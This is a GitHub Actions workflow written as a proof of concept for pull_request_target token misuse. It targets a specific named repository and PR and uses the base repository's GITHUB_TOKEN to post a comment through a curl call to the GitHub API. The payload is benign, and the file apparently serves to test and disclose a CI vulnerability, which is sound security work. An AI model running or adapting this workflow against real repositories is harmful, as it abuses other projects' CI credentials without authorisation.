name: PoC - Comment on Base Repository PR

on:
  pull_request_target:
    types: [opened, synchronize, reopened]

permissions:
  contents: read
  issues: write
  pull-requests: write

jobs:
  prove-base-token-misuse:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout PR code
        uses: actions/checkout@v3

      - name: Post Comment to Base Repository PR
        run: |
          echo "=== Proof of Concept: Base Repo Write Test ==="

          BASE_OWNER="SvavaCapital"
          BASE_REPO="svava-terraform-github-actions"
          TARGET_PR=1

          echo "[*] Attempting to post comment to: $BASE_OWNER/$BASE_REPO PR #$TARGET_PR"

          STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
            -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            https://api.github.com/repos/$BASE_OWNER/$BASE_REPO/issues/$TARGET_PR/comments \
            -d '{"body":"POC tested"}')

          echo "HTTP status from base repo comment API: $STATUS"

          if [ "$STATUS" = "201" ]; then
            echo "[+] PoC SUCCESS: Untrusted PR code used base repository token to comment ‚ùå"
          else
            echo "[-] PoC FAILED with status: $STATUS"
          fi

          echo ""
          echo "Runtime repository (for context only):"
          echo "$GITHUB_REPOSITORY"

          echo "=== End of PoC ==="
